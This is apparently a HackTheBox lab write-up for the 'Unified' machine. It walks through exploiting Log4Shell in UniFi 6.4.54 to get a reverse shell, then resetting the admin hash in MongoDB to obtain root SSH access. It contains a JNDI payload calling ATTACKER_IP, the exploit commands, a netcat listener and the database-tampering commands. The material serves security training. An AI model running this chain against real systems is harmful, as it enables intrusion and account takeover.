
# Unified

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running UniFi Network Application 6.4.54, vulnerable 
to Log4Shell (CVE-2021-44228). Exploiting JNDI injection via the 
login field provides remote code execution. MongoDB credentials 
found allow admin password reset, leading to SSH access as root.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -sCV -p- -A 10.129.20.139
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH |
| 6789 | IBM DB2 Admin |
| 8080 | HTTP Proxy |
| 8443 | UniFi Network (HTTPS) |

---

## 2. Identifying the Vulnerability

Accessed the UniFi login panel:
https://10.129.20.139:8443/manage

Identified version **6.4.54**, vulnerable to **Log4Shell (CVE-2021-44228)**.

Log4Shell abuses JNDI/LDAP to execute remote code when the 
application logs a specially crafted string:
${jndi:ldap://ATTACKER_IP/exploit}

---

## 3. Exploitation

Cloned and compiled the exploit:

```bash
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi
cd Log4jUnifi
pip install -r requirements.txt
mvn package -f utils/rogue-jndi/
```

Started listener:

```bash
nc -lvnp 4444
```

Executed the exploit:

```bash
python3 exploit.py -u https://10.129.20.139:8443 -i 10.10.15.219 -p 4444
```

Received reverse shell.

Retrieved user flag:

```bash
find / -name user.txt 2>/dev/null
cat /home/michael/user.txt
```

---

## 4. Privilege Escalation

Enumerated MongoDB database:

```bash
mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson)'
```

Found administrator account with hashed password.

Generated new password hash:

```bash
openssl passwd -6 password123
```

Updated administrator password in database:

```bash
mongo --port 27117 ace --eval \
'db.admin.update({"name":"administrator"},
{$set:{"x_shadow":"GENERATED_HASH"}})'
```

Logged into UniFi panel with new credentials and found root SSH 
password in Settings.

Connected as root:

```bash
ssh root@10.129.20.139
cat /root/root.txt
```

---

## 5. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Log4jUnifi | Log4Shell exploitation |
| RogueJNDI | Malicious LDAP server |
| netcat | Reverse shell listener |
| MongoDB | Database enumeration |
| openssl | Password hash generation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Log4Shell CVE-2021-44228 | JNDI injection via login field |
| Exposed MongoDB | No authentication on database |
| Weak credentials | Admin password resetable via DB |
